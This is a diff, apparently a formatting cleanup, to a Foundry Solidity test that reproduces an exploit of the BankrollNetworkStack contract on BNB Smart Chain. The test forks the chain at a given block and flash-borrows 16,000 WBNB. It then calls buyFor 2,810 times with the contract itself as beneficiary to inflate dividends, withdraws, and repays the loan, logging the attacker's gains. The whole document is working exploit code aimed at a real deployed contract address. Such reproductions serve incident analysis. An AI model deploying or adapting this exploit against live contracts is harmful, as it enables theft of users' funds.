@@ -1,7 +1,6 @@
 // SPDX-License-Identifier: UNLICENSED
 pragma solidity ^0.8.10;
 
-
 import "forge-std/Test.sol";
 import "./../interface.sol";
 
@@ -25,24 +24,20 @@ contract ContractTest is Test {
     IBankrollNetworkStack bankRoll = IBankrollNetworkStack(0x564D4126AF2B195fFAa7fB470ED658b1D9D07A54);
     uint256 borrow_amount;
 
-
-    function setUp() external 
-    {
-        cheats.createSelectFork("bsc", 42481611 - 1);
+    function setUp() external {
+        cheats.createSelectFork("bsc", 42_481_611 - 1);
     }
 
     function testExploit() external {
-
         emit log_named_decimal_uint("[Begin] Attacker WBNB before exploit", WBNB.balanceOf(address(this)), 18);
 
         borrow_amount = 16_000 ether;
-        pool.flash(address(this),0,borrow_amount, "0x01");
+        pool.flash(address(this), 0, borrow_amount, "0x01");
 
         emit log_named_decimal_uint("[End] Attacker WBNB after exploit", WBNB.balanceOf(address(this)), 18);
     }
 
     function pancakeV3FlashCallback(uint256 fee0, uint256 fee1, bytes memory) public {
-
         WBNB.approve(address(bankRoll), type(uint256).max);
 
         bankRoll.buyFor(address(this), WBNB.balanceOf(address(this)));
@@ -52,7 +47,7 @@ contract ContractTest is Test {
         emit log_named_decimal_uint("[Before] Attacker bank roll balance", bankRoll.myTokens(), 0);
         emit log_named_decimal_uint("[Before] Attacker bank roll dividends", bankRoll.dividendsOf(address(this)), 0);
 
-        for(uint i=0; i < 2810; i++){
+        for (uint256 i = 0; i < 2810; i++) {
             bankRoll.buyFor(address(bankRoll), bal_bank_roll);
         }
 
@@ -63,19 +58,19 @@ contract ContractTest is Test {
         bankRoll.withdraw();
 
         WBNB.transfer(address(pool), borrow_amount + fee0 + fee1);
-
     }
 
-    receive() external payable {
-        
-    }
+    receive() external payable {}
 }
 
-
-interface IBankrollNetworkStack{
-    function buyFor(address _customerAddress, uint buy_amount) external returns (uint256);
+interface IBankrollNetworkStack {
+    function buyFor(address _customerAddress, uint256 buy_amount) external returns (uint256);
     function myTokens() external view returns (uint256);
-    function sell(uint256 _amountOfTokens) external;
-    function dividendsOf(address _customerAddress) external view returns (uint256);
+    function sell(
+        uint256 _amountOfTokens
+    ) external;
+    function dividendsOf(
+        address _customerAddress
+    ) external view returns (uint256);
     function withdraw() external;
 }
